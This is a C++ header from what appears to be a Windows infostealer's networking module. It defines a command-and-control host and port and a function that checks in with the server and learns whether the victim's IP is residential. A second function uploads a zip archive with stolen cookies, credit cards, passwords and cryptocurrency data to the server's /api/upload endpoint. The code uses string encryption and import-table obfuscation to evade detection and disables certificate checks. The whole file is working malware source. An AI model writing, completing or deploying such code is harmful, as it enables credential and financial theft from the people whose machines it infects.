#ifndef simple_net
#define simple_net

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <cstdint>
#include <sysinfo.hpp>
#include <crypto_utils/skCrypter.hpp>
#include <obfuscation/iat_proxy.hpp>
#include <debug_utils/log.hpp>

#ifndef C2_HOST
#define C2_HOST "127.0.0.1"
#endif
#ifndef C2_PORT_NUM
#define C2_PORT_NUM 5000
#endif
#ifndef C2_API_KEY_STR
#define C2_API_KEY_STR ""
#endif

namespace simple_net {

    inline std::wstring to_wstring(const std::string& s) {
        if (s.empty()) return L"";
        int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
        std::wstring r(n - 1, 0);
        MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &r[0], n);
        return r;
    }

    inline std::string to_string(const std::wstring& s) {
        if (s.empty()) return "";
        int n = WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, nullptr, 0, nullptr, nullptr);
        std::string r(n - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, &r[0], n, nullptr, nullptr);
        return r;
    }

    struct c2_check {
        bool ok          = false;
        bool residential = false;
        std::string ip;
        std::string country;
    };

    inline c2_check check_c2() {
        std::wstring host = to_wstring(skCrypt(C2_HOST));

        HINTERNET sess = iat::whttp_open(
            skCrypt(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)"),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!sess) return {};

        HINTERNET conn = iat::whttp_connect(sess, host.c_str(), C2_PORT_NUM, 0);
        if (!conn) { iat::whttp_close_handle(sess); return {}; }

        HINTERNET req = iat::whttp_open_request(conn, skCrypt(L"GET"), skCrypt(L"/api/ping"),
                                                nullptr, WINHTTP_NO_REFERER,
                                                WINHTTP_DEFAULT_ACCEPT_TYPES,
#ifdef _DEBUG
                                                0);
#else
                                                WINHTTP_FLAG_SECURE);
        DWORD sec = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE
                  | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        iat::whttp_set_option(req, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));
#endif
        if (!req) { iat::whttp_close_handle(conn); iat::whttp_close_handle(sess); return {}; }

        bool sent = iat::whttp_send_request(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)
                 && iat::whttp_receive_response(req);

        if (!sent) {
            iat::whttp_close_handle(req);
            iat::whttp_close_handle(conn);
            iat::whttp_close_handle(sess);
            return {};
        }

        std::string body;
        DWORD avail = 0;
        while (iat::whttp_query_data_available(req, &avail) && avail > 0) {
            std::vector<char> buf(avail + 1, 0);
            DWORD rd = 0;
            if (iat::whttp_read_data(req, buf.data(), avail, &rd))
                body.append(buf.data(), rd);
        }

        iat::whttp_close_handle(req);
        iat::whttp_close_handle(conn);
        iat::whttp_close_handle(sess);

        if (body.empty()) return {};

        c2_check r;
        r.ok = true;

        auto find_bool = [&](const std::string& key) -> bool {
            auto pos = body.find(key);
            if (pos == std::string::npos) return false;
            return body.compare(pos + key.size(), 4, skCrypt("true")) == 0;
        };
        auto find_str = [&](const std::string& key) -> std::string {
            auto pos = body.find(key);
            if (pos == std::string::npos) return "";
            pos += key.size();
            auto end = body.find('"', pos);
            if (end == std::string::npos) return "";
            return body.substr(pos, end - pos);
        };

        r.residential = find_bool(skCrypt("\"residential\":"));
        r.ip          = find_str(skCrypt("\"ip\":\""));
        r.country     = find_str(skCrypt("\"country\":\""));
        if (r.country.empty()) r.country = skCrypt("Unknown");

        return r;
    }

    inline bool upload_logs(const std::vector<uint8_t>& zip_data, const std::string& api_key,
                             const std::string& name,    const std::string& ip,
                             const std::string& country, const std::string& cookies,
                             const std::string& creditcards, const std::string& passwords,
                             const std::string& cryptocurrencies,
                             const std::string& windows_version, const std::string& zip_pass) {
        if (zip_data.empty()) return false;

        const std::string boundary = skCrypt("CUBABOUND");
        std::string head;

        head += "--" + boundary + skCrypt("\r\n");
        head += skCrypt("Content-Disposition: form-data; name=\"metadata\"\r\n");
        head += skCrypt("Content-Type: application/json\r\n\r\n");
        head += "{";
        head += skCrypt("\"name\":\"")              + name             + "\",";
        head += skCrypt("\"ip\":\"")                + ip               + "\",";
        head += skCrypt("\"country\":\"")           + country          + "\",";
        head += skCrypt("\"cookies\":")             + cookies          + ",";
        head += skCrypt("\"creditcards\":")         + creditcards      + ",";
        head += skCrypt("\"passwords\":")           + passwords        + ",";
        head += skCrypt("\"cryptocurrencies\":")    + cryptocurrencies       + ",";
        head += skCrypt("\"windows_version\":\"")   + windows_version        + "\",";
        head += skCrypt("\"zip_pass\":\"")           + zip_pass;
        head += "}\r\n";

        std::string username = features::get_username();
        head += "--" + boundary + skCrypt("\r\n");
        head += skCrypt("Content-Disposition: form-data; name=\"file\"; filename=\"") + username + skCrypt(".zip\"\r\n");
        head += skCrypt("Content-Type: application/zip\r\n\r\n");

        std::vector<uint8_t> body(head.begin(), head.end());
        body.insert(body.end(), zip_data.begin(), zip_data.end());

        const std::string tail = skCrypt("\r\n--") + boundary + skCrypt("--\r\n");
        body.insert(body.end(), tail.begin(), tail.end());

        std::wstring host = to_wstring(skCrypt(C2_HOST));

        HINTERNET sess = iat::whttp_open(
            skCrypt(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)"),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!sess) return false;

        HINTERNET conn = iat::whttp_connect(sess, host.c_str(), C2_PORT_NUM, 0);
        if (!conn) { iat::whttp_close_handle(sess); return false; }

        HINTERNET req = iat::whttp_open_request(conn, skCrypt(L"POST"), skCrypt(L"/api/upload"),
                                                nullptr, WINHTTP_NO_REFERER,
                                                WINHTTP_DEFAULT_ACCEPT_TYPES,
#ifdef _DEBUG
                                                0);
#else
                                                WINHTTP_FLAG_SECURE);
        DWORD sec = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE
                  | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        iat::whttp_set_option(req, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));
#endif
        if (!req) { iat::whttp_close_handle(conn); iat::whttp_close_handle(sess); return false; }

        std::wstring key_hdr = skCrypt(L"x-api-key: ") + to_wstring(api_key);
        iat::whttp_add_request_headers(req, key_hdr.c_str(), (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);

        std::wstring ct = skCrypt(L"Content-Type: multipart/form-data; boundary=") + to_wstring(boundary);
        iat::whttp_add_request_headers(req, ct.c_str(), (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);

        iat::whttp_send_request(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
        iat::whttp_receive_response(req);

        DWORD status = 0, sz = sizeof(status);
        iat::whttp_query_headers(req,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            nullptr, &status, &sz, nullptr);

        iat::whttp_close_handle(req);
        iat::whttp_close_handle(conn);
        iat::whttp_close_handle(sess);

        DBG_LOG("upload status: " + std::to_string(status));
        return status >= 200 && status < 300;
    }

} //namespace simple_net

#endif
